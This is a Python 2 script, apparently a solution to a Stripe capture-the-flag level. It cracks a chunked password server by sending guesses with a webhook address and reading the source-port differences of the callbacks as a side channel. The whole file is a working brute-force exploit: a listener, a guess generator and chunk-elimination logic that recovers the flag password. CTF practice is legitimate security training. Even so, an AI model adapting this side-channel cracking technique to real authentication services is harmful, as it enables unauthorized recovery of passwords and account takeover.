import string,cgi,time,httplib
from os import curdir, sep
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

# to start the process, send one request manually e.g.:
# {"password": "000000000000", "webhooks": ["level02-1.stripe-ctf.com:port"]}

#################
# Configuration #
#################
# sServ2Addr - Server 2 (localhost's) hostname (where the webhook can be contacted/bound to)
sServ2Addr = "level02-#.stripe-ctf.com";
# sServ2Port - port for the webproxy (make this something high/random)!
iServ2Port = #####;
# sServ8Addr - Server 8 (the PasswordDB server) hostname
sServ8Addr = "level08-#.stripe-ctf.com";
# sServ8User - Username for Server 8
sServ8User = "user-##########";

###################
# Working Globals #
###################
# you can change the next 4 lines to resume an attack
iChunkAt = 1;
sCrackedChunk1 = "000";
sCrackedChunk2 = "000";
sCrackedChunk3 = "000";
iArrPlace = 0;
arrLeftToTry = range(999);
iLastPort = 0;
iLoopOnChunk = 0;

# handle incoming HTTP requests
class MyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        hi = 0

    def do_POST(self):
        global iChunkAt, iArrPlace, arrLeftToTry, iLastPort, sCrackedChunk1, sCrackedChunk2, sCrackedChunk3, iLoopOnChunk
        varLen = int(self.headers['Content-Length'])
        postVars = self.rfile.read(varLen)
        self.send_response(200)
        self.send_header('Content-type',    'text/plain')
        self.end_headers()
        self.wfile.write("POST OK\n");
        self.wfile.write("Data: "+str(postVars));

        #################################
        # handle checking the port diff #
        #################################
        # - echo the attempt result
        # - remove the attempt from the possibility cue if neccesary
        # - advance the bot.
        if iChunkAt == 1:
            print "["+str(arrLeftToTry[iArrPlace]).zfill(3)+"][000][000][000]",
        elif iChunkAt == 2:
            print "["+sCrackedChunk1.zfill(3)+"]["+str(arrLeftToTry[iArrPlace]).zfill(3)+"][000][000]",
        elif iChunkAt == 3:
            print "["+sCrackedChunk1.zfill(3)+"]["+sCrackedChunk2.zfill(3)+"]["+str(arrLeftToTry[iArrPlace]).zfill(3)+"][000]",
        elif iChunkAt == 4:
            print "["+sCrackedChunk1.zfill(3)+"]["+sCrackedChunk2.zfill(3)+"]["+sCrackedChunk3.zfill(3)+"]["+str(arrLeftToTry[iArrPlace]).zfill(3)+"]",

        iPortDiff = self.client_address[1] - iLastPort
        iLastPort = self.client_address[1]

        if iChunkAt == 4:
            if postVars == '{"success": false}':
                print " -- [NOT THE ANSWER!]"
                iArrPlace = iArrPlace + 1
                doNewConnection()
            else:
                print " -- [WE GOT THE FLAG!]"
                print " [WE GOT THE FLAG!][WE GOT THE FLAG!][WE GOT THE FLAG!][WE GOT THE FLAG!]"
                print "["+sCrackedChunk1.zfill(3)+sCrackedChunk2.zfill(3)+sCrackedChunk3.zfill(3)+str(arrLeftToTry[iArrPlace]).zfill(3)+"] IS THE FLAG FOR '"+sServ8User+"'!"

        else:
            # is this the winning result?
            if len(arrLeftToTry) == 1:
                print " -- [WE GOT THE CHUNK!]"
                print "CHUNK MATCH FOUND: "+str(arrLeftToTry[0])
                iLoopOnChunk = iLoopOnChunk + 1
                if iLoopOnChunk == 8:
                    doAdvanceChunk();

            if iPortDiff == 1 + iChunkAt:
                # this is not a possible result for this chunk
                print " -- [NOT CORRECT] -- [diff: " + str(iPortDiff) + "] -- [Left in chunk: "+str(len(arrLeftToTry))+"]"
                # remove the chunk:
                arrLeftToTry.remove(arrLeftToTry[iArrPlace])

            else:
                # this chunk might be invalid data, or may be a positive
                print " -- [MAYBE MATCH] -- [diff: " + str(iPortDiff) + "] -- [Left in chunk: "+str(len(arrLeftToTry))+"]"
                iArrPlace = iArrPlace + 1

            doNewConnection()

        return
#        except :
        pass

def doAdvanceChunk():
    global iChunkAt, iArrPlace, arrLeftToTry, sCrackedChunk1, sCrackedChunk2, sCrackedChunk3, iLoopOnChunk
    iChunkAt = iChunkAt + 1
    if iChunkAt == 2:
        sCrackedChunk1 = str(arrLeftToTry[0])
    if iChunkAt == 3:
        sCrackedChunk2 = str(arrLeftToTry[0])
    if iChunkAt == 4:
        sCrackedChunk3 = str(arrLeftToTry[0])

    iLoopOnChunk = 0
    arrLeftToTry = range(999);
    iArrPlace = 0

def getFlagTry():
    global iChunkAt, iArrPlace, arrLeftToTry, sCrackedChunk1, sCrackedChunk2, sCrackedChunk3
    if iChunkAt == 1:
        return str(arrLeftToTry[iArrPlace]).zfill(3) + "000000000"
    elif iChunkAt == 2:
        return sCrackedChunk1.zfill(3) + str(arrLeftToTry[iArrPlace]).zfill(3) + "000000"
    elif iChunkAt == 3:
        return sCrackedChunk1.zfill(3) + sCrackedChunk2.zfill(3) + str(arrLeftToTry[iArrPlace]).zfill(3) + "000"
    elif iChunkAt == 4:
        return sCrackedChunk1.zfill(3) + sCrackedChunk2.zfill(3) + sCrackedChunk3.zfill(3) + str(arrLeftToTry[iArrPlace]).zfill(3)
    

def doNewConnection():
    global arrLeftToTry, iArrPlace, sServ2Addr, sServ2Port, sServ8Addr, sServ8User
    if len(arrLeftToTry) - 1 < iArrPlace:
        iArrPlace = 0
    conn = httplib.HTTPSConnection(sServ8Addr, 443)
    sFlagTry = getFlagTry()
    print "Testing Flag: " + sFlagTry
    conn.request("POST", "/"+sServ8User+"/", '{"password": "' + sFlagTry + '", "webhooks": ["'+sServ2Addr+':'+str(iServ2Port)+'"] }')
    conn.close()

def main():
    global iServ2Port
    try:
        server = HTTPServer(('', iServ2Port), MyHandler)
        print 'started httpserver...'
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
        server.socket.close()

if __name__ == '__main__':
    main()
